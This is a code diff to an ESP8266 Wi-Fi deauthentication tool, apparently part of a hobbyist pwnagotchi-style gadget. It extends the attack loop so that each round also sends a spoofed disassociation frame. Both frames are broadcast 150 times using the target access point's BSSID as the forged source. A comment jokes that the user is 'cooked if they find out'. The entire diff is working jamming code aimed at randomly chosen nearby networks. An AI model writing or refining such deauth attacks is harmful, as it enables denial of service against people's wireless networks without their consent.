@@ -22,7 +22,9 @@ String Deauth::randomAP = "";
  * instead of using the deauth frame normally, we append information to the deauth frame and dynamically write info to the frame
  * 
 */
+
 uint8_t Deauth::deauthFrame[26];
+uint8_t Deauth::disassociateFrame[26];
 
 void Deauth::add(const std::string& bssids) {
     std::stringstream ss(bssids);
@@ -48,6 +50,13 @@ void Deauth::list() {
     for (const auto& bssid : Config::whitelist) {
         Deauth::add(bssid);
     }
+}
+
+bool Deauth::send(uint8 *buf, int len, bool sys_seq) {
+    bool sent = wifi_send_pkt_freedom(buf, len, sys_seq) == 0;
+    delay(102);
+
+    return sent;
 }
 
 void Deauth::select() {
@@ -102,14 +111,20 @@ void Deauth::select() {
 
         // clear out exisitng frame...
         std::fill(std::begin(Deauth::deauthFrame), std::end(Deauth::deauthFrame), 0);
+        std::fill(std::begin(Deauth::disassociateFrame), std::end(Deauth::disassociateFrame), 0);
 
         Deauth::deauthFrame[0] = 0xC0; // type
         Deauth::deauthFrame[1] = 0x00; // subtype
         Deauth::deauthFrame[2] = 0x00; // duration (SDK takes care of that)
         Deauth::deauthFrame[3] = 0x00; // duration (SDK takes care of that)
 
+        Deauth::disassociateFrame[0] = 0xA0; // type
+        Deauth::disassociateFrame[1] = 0x00; // subtype
+        Deauth::disassociateFrame[2] = 0x00; // duration (SDK takes care of that)
+        Deauth::disassociateFrame[3] = 0x00; // duration (SDK takes care of that)
+
         // bssid
-        uint8_t* bssid = WiFi.BSSID(randomIndex);
+        uint8_t* apBssid = WiFi.BSSID(randomIndex);
 
          // set our mac address
         uint8_t mac[WL_MAC_ADDR_LENGTH];
@@ -127,9 +142,15 @@ void Deauth::select() {
         */
 
         // copy our mac(s) to header
-        std::copy(broadcastAddr, broadcastAddr + sizeof(bssid), Deauth::deauthFrame + 4);
-        std::copy(mac, mac + sizeof(mac), Deauth::deauthFrame + 10);
-        std::copy(bssid, bssid + sizeof(bssid), Deauth::deauthFrame + 16);
+        std::copy(broadcastAddr, broadcastAddr + sizeof(broadcastAddr), Deauth::deauthFrame + 4);
+        // std::copy(mac, mac + sizeof(mac), Deauth::deauthFrame + 10);
+        std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::deauthFrame + 10);
+        std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::deauthFrame + 16);
+
+        std::copy(broadcastAddr, broadcastAddr + sizeof(apBssid), Deauth::disassociateFrame + 4);
+        // std::copy(mac, mac + sizeof(mac), Deauth::disassociateFrame + 10);
+        std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::disassociateFrame + 10);
+        std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::disassociateFrame + 16);
     } else {
         // well ur fucked.
         Serial.println("(;-;) No access points found.");
@@ -180,17 +201,14 @@ void Deauth::deauth() {
 
 void Deauth::start() {
     running = true;
-    int frameSize = sizeof(deauthFrame);
+    int deauthFrameSize = sizeof(deauthFrame);
+    int disassociateFrameSize = sizeof(disassociateFrame);
     int packets = 0;
     unsigned long startTime = millis();
 
     // send the deauth 150 times(ur cooked if they find out)
     for (int i = 0; i < 150; ++i) {
-        bool sent = wifi_send_pkt_freedom(const_cast<uint8_t*>(deauthFrame), frameSize, 0) == 0;
-        delay(102);
-
-        if (sent) {
-            // calculate packets per second
+        if (Deauth::send(const_cast<uint8_t*>(deauthFrame), deauthFrameSize, 0) && Deauth::send(const_cast<uint8_t*>(disassociateFrame), disassociateFrameSize, 0)) {
             packets++;
             float pps = packets / (float)(millis() - startTime) * 1000;
 
@@ -201,7 +219,7 @@ void Deauth::start() {
                 Serial.println(" pkt/s");
                 Display::cleanDisplayFace("(>-<)");
                 Display::attachSmallText("Packets per second: " + (String) pps + " pkt/s");
-            }
+            } 
         } else {
             Serial.println("(X-X) Packet failed to send!");
         }
